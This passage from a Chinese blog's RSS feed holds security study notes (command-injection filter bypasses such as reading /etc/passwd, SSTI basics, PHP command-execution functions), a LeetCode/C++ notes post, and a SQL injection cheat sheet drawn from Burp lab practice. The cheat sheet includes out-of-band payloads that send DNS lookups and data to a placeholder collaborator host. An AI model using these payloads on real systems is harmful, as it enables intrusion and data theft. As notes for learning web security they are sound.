&lt;p&gt;垂直越权是不同级别之间或不同角色之间的越权，垂直越权还可以分为向上越权和向下越权。向上越权指的是一个低级别用户尝试访问高级别用户的资源，比如说某个系统分为普通用户和管理员用户，管理员有系统管理功能，而普通用户没有，那我们就可以理解成管理功能具备垂直权限划分，如果普&lt;br /&gt;
通用户能利用某种攻击手段访问到管理功能，那我们就称之为向上越权。向下越权是一个高级别用户访问低级别用户信息。&lt;/p&gt;
&lt;h2 id=&#34;命令执行&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#命令执行&#34;&gt;#&lt;/a&gt; 命令执行&lt;/h2&gt;
&lt;h3 id=&#34;绕过-9&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过-9&#34;&gt;#&lt;/a&gt; 绕过&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;空格过滤绕过&lt;br /&gt;
使用以下符号:&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$&amp;#123;IFS&amp;#125;, $&amp;#123;IFS&amp;#125;$1, &amp;lt;&amp;gt;, &amp;lt;, &amp;gt;, &amp;#123;cat,/etc/passwd&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;关键词过滤绕过&lt;br /&gt;
以 cat 为例，使用以下办法：&lt;br /&gt;
、、、&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ca\t, cat&#39;&#39;t, a=l;b=s;ab, /bin/ca*, /bin/ca?, /binca [tc]&lt;br /&gt;
、、、&lt;br /&gt;
或者换成其它命令：head, tail, less, tac&lt;/p&gt;
&lt;h2 id=&#34;模板注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#模板注入&#34;&gt;#&lt;/a&gt; 模板注入&lt;/h2&gt;
&lt;p&gt;模板引擎（这里特指用于 Web 开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，利用模板引擎来生成前端的 html 代码，模板引擎会提供一套生成 html 代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板 + 用户数据的前端 html 页面，然后反馈给浏览器，呈现在用户面前。&lt;br /&gt;
SSTI 就是服务器端模板注入（Server-Side Template Injection）&lt;br /&gt;
当前使用的一些框架，比如 python 的 flask，php 的 tp，java 的 spring 等一般都采用成熟的的 MVC 的模式，用户的输入先进入 Controller 控制器，然后根据请求类型和请求的指令发送给对应 Model 业务模型进行业务逻辑判断，数据库存取，最后把结果返回给 View 视图层，经过模板渲染展示给用户。&lt;br /&gt;
漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。&lt;/p&gt;
&lt;p&gt;测试方法：4 4&lt;/p&gt;
&lt;h1 id=&#34;php-命令执行函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#php-命令执行函数&#34;&gt;#&lt;/a&gt; PHP 命令执行函数&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;system ()：函数执行有回显，将执行结果输出到页面上。&lt;/li&gt;
&lt;li&gt;passthru ()：函数执行有回显，将执行结果输出到页面上。&lt;/li&gt;
&lt;li&gt;exec (): 函数执行无回显，默认返回最后一行结果&lt;/li&gt;
&lt;li&gt;shell_exec (): 函数执行默认无回显，通过 echo 可将执行结果输出到页面。&lt;/li&gt;
&lt;li&gt;popen ()：打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。&lt;/li&gt;
&lt;li&gt;proc_open ()：函数与 Popen 函数类似，但是可以提供双向管道&lt;/li&gt;
&lt;li&gt;pcntl_exec ()：函数的作用是在当前进程空间执行指定程序&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://ericcd.com/2022/11/29/algorithm/leetcode/</guid>
            <title>leetcode</title>
            <link>http://ericcd.com/2022/11/29/algorithm/leetcode/</link>
            <category term="算法" scheme="http://ericcd.com/categories/algorithm/" />
            <pubDate>Tue, 29 Nov 2022 19:26:56 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;LeetCode 记录。&lt;br /&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;使用单调栈求坡的最大宽度。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;填充每个节点的下一个右侧节点指针 II：&lt;br /&gt;
给定一个二叉树，填充它的每个 next 指针，让这个指针指向其下一个右侧节点。如果找不到下一个右侧节点，则将 next 指针设置为 NULL。初始状态下，所有 next 指针都被设置为 NULL。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;数字范围按位与：&lt;br /&gt;
给你两个整数 left 和 right ，表示区间 [left, right] ，返回此区间内所有数字 按位与 的结果（包含 left 、right 端点）。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;清空 vector 元素并释放空间。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vector&amp;lt;int&amp;gt; ().swap (Vector);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;重新排列单词间的空格。&lt;br /&gt;
使用流区分字符和空格；string 的创建方式。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;string reorderSpaces (string text) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           vector&amp;lt;string&amp;gt;  str_vec;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           int count = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           string word, ans;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           stringstream in (text);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           while (in &amp;gt;&amp;gt; word)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               str_vec.push_back (word);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               count += word.size (); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           if (str_vec.size () == 1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              ans = str_vec [0];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            else&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                string space ((text.size () - count)/(str_vec.size () - 1), &amp;#x27; &amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                for (int i =0; i&amp;lt; str_vec.size () - 1; i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                       ans += str_vec [i] + space;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                ans += str_vec.back ();        &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            return ans + string (text.size () - ans.size (), &amp;#x27; &amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;数组的相对排序。&lt;br /&gt;
unordered_map，hash 表的使用；sort 的自定义排序方法。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;旋转数字&lt;br /&gt;
 8.Lambda 表达式&lt;br /&gt;
该表达式的使用&lt;br /&gt;
 9.c++ 二分查找函数&lt;br /&gt;
 lower_bound ()、upper_bound ()、equal_range () 以及 binary_search ()。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;前缀和矩阵&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sum = A [x1..x2][y1..y2]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    = P [x2][y2] - P [x1 - 1][y2] - P [x2][y1 - 1] + P [x1 - 1][y1 - 1]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;差分数组&lt;br /&gt;
有利于对固定数组大量做区间加减并查询&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;前缀和&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://ericcd.com/2022/11/22/cybersecurity/BurpLab/</guid>
            <title>BurpLab</title>
            <link>http://ericcd.com/2022/11/22/cybersecurity/BurpLab/</link>
            <category term="网络安全" scheme="http://ericcd.com/categories/cybersecurity/" />
            <pubDate>Tue, 22 Nov 2022 20:13:02 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;记录在做 burp lab 时学会的知识点。&lt;br /&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;sql-注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql-注入&#34;&gt;#&lt;/a&gt; SQL 注入&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;使用 select 判断列数和获取返回值时，有时 SELECT 1,2,3 不行而 SELECT NULL,NULL,NULL 可以，可能是因为 sql 的返回值类型需要与后端接收的类型相匹配，SELECT 1,2,3 返回的都是数字，而使用 NULL 会返回不确定类型 NULL。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;只能返回一条字符串语句，但是需要读取多个字符串的值时，可以使用字符串拼接。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Oracle:  &amp;#x27;foo&amp;#x27;||&amp;#x27;bar&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Microsoft:  &amp;#x27;foo&amp;#x27;+&amp;#x27;bar&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PostgreSQL:  foo&amp;#x27;||&amp;#x27;bar&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MySQL:  &amp;#x27;foo&amp;#x27; &amp;#x27;bar&amp;#x27; [Note the space between the two strings],  CONCAT (&amp;#x27;foo&amp;#x27;,&amp;#x27;bar&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在 Oracle 中，每一条 SELECT 语句后续都要跟一个 FROM，如果不确定要搜索哪个表，可以使用虚表 dual 来进行测试，例如 SELECT NULL FROM dual。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;获取数据库版本信息。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Oracle:  SELECT banner FROM v$version,  SELECT version FROM v$instance&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Microsoft:  SELECT @@version&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PostgreSQL:  SELECT version ()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MySQL:  SELECT @@version&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;获取数据库中存储的表名以及其中的列名。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Oracle:  SELECT * FROM all_tables,  SELECT * FROM all_tab_columns WHERE table_name = &amp;#x27;TABLE-NAME-HERE&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Microsoft:  SELECT * FROM information_schema.tables,  SELECT * FROM information_schema.columns WHERE table_name = &amp;#x27;TABLE-NAME-HERE&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PostgreSQL:  SELECT * FROM information_schema.tables,  SELECT * FROM information_schema.columns WHERE table_name = &amp;#x27;TABLE-NAME-HERE&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MySQL:  SELECT * FROM information_schema.tables,  SELECT * FROM information_schema.columns WHERE table_name = &amp;#x27;TABLE-NAME-HERE&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;6.Oracle 中没有 LIMIT 命令，可以试着用 ROWNUM 取代下。&lt;br /&gt;
7. 可以用以下命令测试网页是否会根据返回值的 Ture or False 变换。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Oracle SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR (1/0) ELSE NULL END FROM dual&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Microsoft	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PostgreSQL	1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN CAST (1/0 AS INTEGER) ELSE NULL END)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MySQL	SELECT IF (YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),&amp;#x27;a&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;ol start=&#34;8&#34;&gt;
&lt;li&gt;
&lt;p&gt;后端可能接受一个 int 值，也可能接收 string，也可能接收一行，这需要自己测试判断。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;获取截断的字符串。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Oracle	SUBSTR (&amp;#x27;foobar&amp;#x27;, 4, 2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Microsoft	SUBSTRING (&amp;#x27;foobar&amp;#x27;, 4, 2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PostgreSQL	SUBSTRING (&amp;#x27;foobar&amp;#x27;, 4, 2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MySQL	SUBSTRING (&amp;#x27;foobar&amp;#x27;, 4, 2)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;延时注入，但是后端如果异步执行 SQL，可能造成该方法失效。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Oracle	dbms_pipe.receive_message ((&amp;#x27;a&amp;#x27;),10)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Microsoft	WAITFOR DELAY &amp;#x27;0:0:10&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PostgreSQL	SELECT pg_sleep (10)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MySQL	SELECT SLEEP (10)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
11.DNS 查询&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Oracle：SELECT EXTRACTVALUE (xmltype (&amp;#x27;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &amp;lt;!DOCTYPE root [ &amp;lt;!ENTITY % remote SYSTEM &amp;quot;http://BURP-COLLABORATOR-SUBDOMAIN/&amp;quot;&amp;gt; % remote;]&amp;gt;&amp;#x27;),&amp;#x27;/l&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              FROM dual（有的版本能用，有的版本已经修复了）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              SELECT UTL_INADDR.get_host_address (&amp;#x27;BURP-COLLABORATOR-SUBDOMAIN&amp;#x27;)（所有版本都能用，但需要权限）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Microsoft：  exec master..xp_dirtree &amp;#x27;//BURP-COLLABORATOR-SUBDOMAIN/a&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PostgreSQL： copy (SELECT &amp;#x27;&amp;#x27;) to program &amp;#x27;nslookup BURP-COLLABORATOR-SUBDOMAIN&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MySQL： LOAD_FILE (&amp;#x27;\\\\BURP-COLLABORATOR-SUBDOMAIN\\a&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                SELECT ... INTO OUTFILE &amp;#x27;\\\\BURP-COLLABORATOR-SUBDOMAIN\a&amp;#x27;（只适用于 windows 后端）&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用 DNS 查询带数据：&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Oracle:  SELECT EXTRACTVALUE (xmltype (&amp;#x27;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;lt;!DOCTYPE root [ &amp;lt;!ENTITY % remote SYSTEM &amp;quot;http://&amp;#x27;||(SELECT 